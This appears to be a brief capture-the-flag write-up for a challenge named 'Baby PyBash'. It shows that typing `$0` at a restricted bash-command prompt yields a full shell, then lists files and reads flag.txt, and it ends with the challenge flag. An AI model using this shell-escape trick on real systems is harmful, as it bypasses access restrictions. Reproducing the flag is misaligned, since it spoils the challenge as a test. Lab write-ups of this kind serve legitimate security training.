---
ai_date: 2025-04-27 05:14:01
ai_summary: Exploitation involves using `$0` to gain bash access and retrieve the flag
ai_tags:
  - shell
  - cmd-injection
  - exploitation
created: 2024-08-30T19:04
points: 50
solves: 211
updated: 2025-07-14T09:46
---

Just use `$0` and you will have bash access.

```
== proof-of-work: disabled ==
Welcome to Baby PyBash!

Enter a bash command: $0
ls
chall.py
flag.txt
run.sh
cat flag.txt
```

```flag
CSCTF{b4sH_w1z4rd_0r_ju$t_ch33s3_m4st3r?_c1d4eeb2a}
```